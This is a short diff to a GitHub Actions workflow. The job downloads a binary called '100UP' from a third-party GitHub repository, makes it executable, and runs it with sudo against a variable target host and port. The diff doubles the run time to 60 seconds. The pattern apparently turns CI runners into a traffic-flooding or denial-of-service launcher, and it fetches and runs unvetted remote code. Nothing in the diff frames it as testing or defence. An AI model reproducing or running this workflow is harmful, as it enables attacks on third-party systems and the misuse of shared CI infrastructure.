@@ -32,9 +32,9 @@ jobs:
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/100UP -O 100UP
           chmod +x 100UP || true
           
-          sudo timeout 30 ./100UP "$TARGET" "$PORT" 16 -1 30 32 &
+          sudo timeout 60 ./100UP "$TARGET" "$PORT" 16 -1 60 32 &
           
       - name: Finish !
         run: |
-          sleep 30
+          sleep 60
           exit 0
